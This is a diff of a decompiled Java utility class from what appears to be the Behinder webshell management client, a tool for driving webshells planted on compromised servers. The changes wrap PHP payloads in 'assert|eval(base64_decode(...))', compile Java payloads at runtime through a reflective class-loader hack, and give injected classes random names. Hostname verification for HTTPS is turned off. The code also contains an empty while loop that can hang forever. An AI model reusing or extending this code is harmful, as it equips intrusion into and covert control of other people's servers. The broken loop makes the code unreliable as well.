@@ -30,6 +30,7 @@ import java.net.Proxy;
 import java.net.Socket;
 import java.net.URI;
 import java.net.URL;
+import java.net.URLClassLoader;
 import java.net.URLDecoder;
 import java.net.UnknownHostException;
 import java.security.KeyManagementException;
@@ -75,10 +76,11 @@ import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 import javax.tools.FileObject;
 import javax.tools.ForwardingJavaFileManager;
+import javax.tools.JavaCompiler;
 import javax.tools.JavaFileManager;
 import javax.tools.JavaFileObject;
 import javax.tools.SimpleJavaFileObject;
-import javax.tools.JavaFileManager.Location;
+import javax.tools.ToolProvider;
 import javax.tools.JavaFileObject.Kind;
 import net.rebeyond.behinder.core.Constants;
 import net.rebeyond.behinder.core.Crypt;
@@ -94,7 +96,7 @@ public class Utils {
    private static Map fileObjects = new ConcurrentHashMap();
    public static Map alertMap = new HashMap();
 
-   public static Alert getAlert(AlertType type) {
+   public static Alert getAlert(Alert.AlertType type) {
       Alert alert = (Alert)alertMap.get(type);
       if (alert == null) {
          alert = new Alert(type);
@@ -160,15 +162,39 @@ public class Utils {
       return result.toString();
    }
 
-   public static Map requestAndParse(String urlPath, Map header, byte[] data, int beginIndex, int endIndex) throws Exception {
+   public static Map requestAndParse(String urlPath, Map header, byte[] data, int compareMode, int beginIndex, int endIndex, byte[] prefixBytes, byte[] suffixBytes) throws Exception {
       Map resultObj = sendPostRequestBinary(urlPath, header, data);
-      byte[] resData = (byte[])((byte[])resultObj.get("data"));
-      if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
-         resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
-      }
-
+      byte[] resData = (byte[])resultObj.get("data");
       resultObj.put("data", resData);
       return resultObj;
+   }
+
+   private static void addToolsLib(URL jarPath) throws Exception {
+      Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
+      method.setAccessible(true);
+      URLClassLoader classLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
+      method.invoke(classLoader, jarPath);
+      method.setAccessible(false);
+   }
+
+   private static JavaCompiler getCompilerInner() throws Exception {
+      Class JavacTool = Class.forName("com.sun.tools.javac.api.JavacTool");
+      JavaCompiler javaCompiler = (JavaCompiler)JavacTool.newInstance();
+      return javaCompiler;
+   }
+
+   public static JavaCompiler getCompiler() throws Exception {
+      JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
+      if (javaCompiler != null) {
+         return javaCompiler;
+      } else {
+         javaCompiler = getCompilerInner();
+         if (javaCompiler != null) {
+            return javaCompiler;
+         } else {
+            throw new Exception("本地机器上没有找到编译环境，请确认:1.是否安装了JDK环境;2." + System.getProperty("java.home") + File.separator + "lib目录下是否有tools.jar.");
+         }
+      }
    }
 
    public static Map sendPostRequestBinary(String urlPath, Map header, byte[] data) throws Exception {
@@ -215,14 +241,13 @@ public class Utils {
          String encoding = conn.getContentEncoding();
          DataInputStream din;
          byte[] buffer;
-         boolean var24;
          if (encoding != null) {
             if (encoding != null && encoding.equals("gzip")) {
                din = null;
                GZIPInputStream gZIPInputStream = new GZIPInputStream(conn.getInputStream());
                din = new DataInputStream(gZIPInputStream);
                buffer = new byte[1024];
-               boolean var12 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -230,7 +255,7 @@ public class Utils {
             } else {
                din = new DataInputStream(conn.getInputStream());
                buffer = new byte[1024];
-               var24 = false;
+               length = 0;
 
                while((length = din.read(buffer)) != -1) {
                   bos.write(buffer, 0, length);
@@ -239,7 +264,7 @@ public class Utils {
          } else {
             din = new DataInputStream(conn.getInputStream());
             buffer = new byte[1024];
-            var24 = false;
+            length = 0;
 
             while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
@@ -262,7 +287,7 @@ public class Utils {
       } else {
          DataInputStream din = new DataInputStream(conn.getErrorStream());
          byte[] buffer = new byte[1024];
-         boolean var21 = false;
+         length = 0;
 
          while((length = din.read(buffer)) != -1) {
             bos.write(buffer, 0, length);
@@ -371,7 +396,7 @@ public class Utils {
       Map params = new HashMap();
       byte[] bincls = new byte[0];
       if (type.equals("jsp")) {
-         bincls = Params.getParamedClass("Eval", (Map)params, (TransProtocol)transProtocol);
+         bincls = Params.getParamedClass((String)"Eval", (Map)params, (TransProtocol)transProtocol);
       } else if (type.equals("asp")) {
          bincls = (new String(bincls)).replace("__Encrypt__", transProtocol.getEncode()).getBytes();
       } else if (type.equals("php")) {
@@ -379,14 +404,18 @@ public class Utils {
       } else if (type.equals("aspx")) {
       }
 
-      return getEvalData(cryptor, key, type, bincls);
+      return getEvalData(cryptor, type, bincls);
    }
 
-   public static byte[] getEvalData(ICrypt cryptor, String key, String type, byte[] payload) throws Exception {
+   public static byte[] getEvalData(ICrypt cryptor, String type, byte[] payload) throws Exception {
       byte[] result = null;
       if (type.equals("jsp")) {
          result = cryptor.encrypt(payload);
       } else if (type.equals("php")) {
+         if (!cryptor.isCustomized()) {
+            payload = ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(payload) + "'));").getBytes();
+         }
+
          result = cryptor.encrypt(payload);
       } else if (type.equals("aspx")) {
          Map params = new LinkedHashMap();
@@ -479,6 +508,37 @@ public class Utils {
       return extIndex >= 0 ? fileName.substring(extIndex + 1).toLowerCase() : "";
    }
 
+   public static String getRandomClassName(String sourceName) {
+      String[] domainAs = new String[]{"com", "net", "org", "sun"};
+      String domainB = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
+      String domainC = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
+      String domainD = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
+      String className = getRandomAlpha((new Random()).nextInt(7) + 4);
+      className = className.substring(0, 1).toUpperCase() + className.substring(1).toLowerCase();
+      int domainAIndex = (new Random()).nextInt(4);
+      String domainA = domainAs[domainAIndex];
+      int randomSegments = (new Random()).nextInt(3) + 3;
+      String randomName;
+      switch (randomSegments) {
+         case 3:
+            randomName = domainA + "/" + domainB + "/" + className;
+            break;
+         case 4:
+            randomName = domainA + "/" + domainB + "/" + domainC + "/" + className;
+            break;
+         case 5:
+            randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
+            break;
+         default:
+            randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
+      }
+
+      while(randomName.length() > sourceName.length()) {
+      }
+
+      return randomName;
+   }
+
    public static byte[] getData(ICrypt cryptor, String className, Map params, String scriptType, byte[] extraData) throws Exception {
       byte[] bincls;
       byte[] encrypedBincls;
@@ -492,6 +552,10 @@ public class Utils {
          return encrypedBincls;
       } else if (scriptType.equals("php")) {
          bincls = Params.getParamedPhp(className, params, cryptor.getTransProtocol(scriptType));
+         if (!cryptor.isCustomized()) {
+            bincls = ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(bincls) + "'));").getBytes();
+         }
+
          if (extraData != null) {
             bincls = CipherUtils.mergeByteArray(bincls, extraData);
          }
@@ -619,7 +683,7 @@ public class Utils {
       byte[] buffer = new byte[10240000];
 
       int length;
-      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
+      for(length = 0; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
       }
 
       fis.close();
@@ -637,9 +701,8 @@ public class Utils {
       List result = new ArrayList();
       byte[] buffer = new byte[size];
       ByteArrayInputStream bis = new ByteArrayInputStream(content);
-      boolean var5 = false;
+      int length = 0;
 
-      int length;
       while((length = bis.read(buffer)) > 0) {
          result.add(Arrays.copyOfRange(buffer, 0, length));
       }
@@ -708,9 +771,8 @@ public class Utils {
       InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
       ByteArrayOutputStream bos = new ByteArrayOutputStream();
       byte[] buffer = new byte[102400];
-      boolean var4 = false;
+      int num = 0;
 
-      int num;
       while((num = is.read(buffer)) != -1) {
          bos.write(buffer, 0, num);
          bos.flush();
@@ -915,7 +977,7 @@ public class Utils {
             }
          }
 
-         HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
+         HttpsURLConnection.setDefaultSSLSocketFactory(new MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
          HostnameVerifier allHostsValid = new HostnameVerifier() {
             public boolean verify(String hostname, SSLSession session) {
                return true;
@@ -1090,11 +1152,7 @@ public class Utils {
    }
 
    public static void showErrorMessage(String title, String msg) {
-      Alert alert = new Alert(AlertType.ERROR);
-      Window window = alert.getDialogPane().getScene().getWindow();
-      window.setOnCloseRequest((event) -> {
-         window.hide();
-      });
+      Alert alert = getAlert(AlertType.ERROR);
       alert.setTitle(title);
       alert.setHeaderText("");
       alert.setContentText(msg);
@@ -1234,27 +1292,6 @@ public class Utils {
       return list.get(size - 1);
    }
 
-   public static class MyJavaFileManager extends ForwardingJavaFileManager {
-      protected MyJavaFileManager(JavaFileManager fileManager) {
-         super(fileManager);
-      }
-
-      public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
-         JavaFileObject javaFileObject = (JavaFileObject)Utils.fileObjects.get(className);
-         if (javaFileObject == null) {
-            super.getJavaFileForInput(location, className, kind);
-         }
-
-         return javaFileObject;
-      }
-
-      public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
-         JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
-         Utils.fileObjects.put(qualifiedClassName, javaFileObject);
-         return javaFileObject;
-      }
-   }
-
    private static class MySSLSocketFactory extends SSLSocketFactory {
       private SSLSocketFactory sf;
       private String[] enabledCiphers;
@@ -1308,6 +1345,27 @@ public class Utils {
       }
    }
 
+   public static class MyJavaFileManager extends ForwardingJavaFileManager {
+      protected MyJavaFileManager(JavaFileManager fileManager) {
+         super(fileManager);
+      }
+
+      public JavaFileObject getJavaFileForInput(JavaFileManager.Location location, String className, JavaFileObject.Kind kind) throws IOException {
+         JavaFileObject javaFileObject = (JavaFileObject)Utils.fileObjects.get(className);
+         if (javaFileObject == null) {
+            super.getJavaFileForInput(location, className, kind);
+         }
+
+         return javaFileObject;
+      }
+
+      public JavaFileObject getJavaFileForOutput(JavaFileManager.Location location, String qualifiedClassName, JavaFileObject.Kind kind, FileObject sibling) throws IOException {
+         JavaFileObject javaFileObject = new MyJavaFileObject(qualifiedClassName, kind);
+         Utils.fileObjects.put(qualifiedClassName, javaFileObject);
+         return javaFileObject;
+      }
+   }
+
    public static class MyJavaFileObject extends SimpleJavaFileObject {
       private String source;
       private ByteArrayOutputStream outPutStream;
@@ -1317,7 +1375,7 @@ public class Utils {
          this.source = source;
       }
 
-      public MyJavaFileObject(String name, Kind kind) {
+      public MyJavaFileObject(String name, JavaFileObject.Kind kind) {
          super(URI.create("String:///" + name + kind.extension), kind);
          this.source = null;
       }
